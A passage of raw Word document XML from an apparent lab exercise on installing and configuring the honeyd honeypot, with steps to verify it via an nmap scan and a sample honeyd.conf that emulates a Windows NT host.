        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nux </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ne </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he honeyd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ach</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>e w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t'</w:t>
      </w:r>
      <w:r>
        <w:t>s IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>addre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="46"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Af</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er honeyd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sful</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>, check</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>requ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>red</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of honeyd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are open</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>se n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o scan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e open por</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s of honeyd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ach</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ne.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.  If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he requ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ed por</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">open, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">honeyd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng corre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</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O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId48">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 xml:space="preserve">yum </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nsta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>honeyd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId49">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vi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>etc/h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>neyd.conf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228" w:right="5937"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228" w:right="610"/>
      </w:pPr>
      <w:r>
        <w:t>set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws persona</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>y "M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>crosoft</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndows NT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>4.0 Server SP5-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>P6" add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ws </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>cp port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>80 open</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228" w:right="4345"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ws </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>cp port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>139 open add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ws </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>cp port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>137 open add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws udp port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>137 open add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws udp port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>135 open</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228" w:right="3933"/>
      </w:pPr>
      <w:r>
        <w:t>set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws defau</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>cp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>reset set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws defau</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>udp ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on reset</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228" w:right="3388"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hern</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>“00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>24</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>8c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>12”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228" w:right="5022"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">172.16.8.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o p4p1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3132"/>
      </w:pPr>
      <w:hyperlink r:id="rId5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honeyd -i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>p4p1  -d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">-f  honeyd.conf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t>oneyd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>V1.5c Copyr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
